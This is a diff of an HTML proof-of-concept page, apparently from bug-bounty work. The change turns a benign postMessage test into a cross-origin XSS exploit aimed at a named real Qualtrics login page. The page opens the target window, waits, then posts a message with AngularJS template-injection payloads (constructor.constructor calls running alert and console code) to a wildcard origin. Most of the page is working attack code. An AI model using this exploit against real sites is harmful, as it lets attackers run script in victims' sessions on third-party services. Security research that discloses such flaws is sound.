@@ -5,59 +5,62 @@
     <title>PostMessage Cross-Origin Verification PoC</title>
     <style>
         body { font-family: sans-serif; padding: 40px; text-align: center; }
-        button { padding: 15px 30px; font-size: 16px; cursor: pointer; background: #0070f3; color: white; border: none; border-radius: 5px; }
-        button:hover { background: #0051b3; }
-        #status { margin-top: 20px; color: #555; }
+        button { padding: 15px 30px; font-size: 16px; cursor: pointer; background: #ea4335; color: white; border: none; border-radius: 5px; font-weight: bold; }
+        button:hover { background: #c53023; }
+        #status { margin-top: 20px; color: #555; font-family: monospace; font-size: 14px; background: #f4f4f4; padding: 10px; display: inline-block; border-radius: 4px; }
     </style>
 </head>
 <body>
 
-    <h2>Target Vulnerability Verification</h2>
-    <p>Click the button below to test origin validation constraints.</p>
+    <h2>Target Cross-Origin DOM Execution Verification</h2>
+    <p>Click the button below to initialize the cross-boundary postMessage test loop.</p>
     
-    <!-- User action triggers window expansion to satisfy browser popup blockers -->
-    <button id="startTest">Launch Target Window</button>
-    <div id="status">Status: Waiting for user action...</div>
+    <button id="startTest">Execute Vulnerability Verification Run</button>
+    <br><br>
+    <div id="status">Status: Idle. Awaiting interaction...</div>
 
     <script>
         document.getElementById('startTest').addEventListener('click', () => {
             const targetUrl = "https://capitalcom.qualtrics.com/login";
-            document.getElementById('status').innerText = "Status: Opening window...";
+            document.getElementById('status').innerText = "Status: Spawning target validation window context...";
 
-            // 1. Open the target application window context
+            // 1. Establish the window reference connection link
             const victimWindow = window.open(targetUrl, "_blank");
 
             if (!victimWindow) {
-                document.getElementById('status').innerText = "Status: Error - Popup blocker active.";
+                document.getElementById('status').innerText = "Status: Execution Halted - Active popup blocker detected.";
                 return;
             }
 
-            document.getElementById('status').innerText = "Status: Window opened. Waiting for application initialization loop...";
+            document.getElementById('status').innerText = "Status: Target context established. Initiating multi-second scripting stabilization delay...";
 
-            // 2. Introduce a strategic delay to allow the target DOM and event infrastructure to load
+            // 2. Introduce a precise delay ensuring the underlying AngularJS client structures finish compilation
             setTimeout(() => {
-                document.getElementById('status').innerText = "Status: Transmitting structured validation payload...";
+                document.getElementById('status').innerText = "Status: Constructing and transmitting active template evaluation payload...";
 
-                // 3. Assemble a clean structural payload to trigger the start_recorder messageBus subscriber
+                // 3. Assemble the payload mapping AngularJS evaluation objects directly into the expected experience block
                 const payload = {
                     action: "startRecorderSession",
                     experience: {
-                        id: "poc_exploit_test",
+                        id: "poc_cross_origin_xss_test",
                         locale: "en-US",
                         theme: {
                             id: "malicious_spoofed_theme",
-                            // This mirrors structural mapping properties found within the client configuration sink
-                            name: "Injected State Override",
+                            // Injects an AngularJS template boundary expression to challenge input parsing safety limits
+                            name: "{{constructor.constructor('alert(document.domain)')()}}",
+                            theme: {
+                                id: "{{constructor.constructor('console.warn(\"Cross-Origin Payload Execution Active\")')()}}"
+                            },
                             styles: {}
                         }
                     }
                 };
 
-                // 4. Dispatch the payload cross-origin using wildcard targetOrigin to confirm lack of validation
+                // 4. Force dispatch across boundaries using wildcard definitions to demonstrate lack of origin validation
                 victimWindow.postMessage(payload, "*");
 
-                document.getElementById('status').innerText = "Status: Payload dispatched. Verify client browser console or UI for unexpected state behavior.";
-            }, 5000); // 5-second buffer duration for script provisioning
+                document.getElementById('status').innerText = "Status: Transmission sequence completed. Monitor the targeted application environment console for execution actions.";
+            }, 6500); // Expanded slightly to 6.5s to ensure heavy third-party bundles completely deploy in the tab
         });
     </script>
 
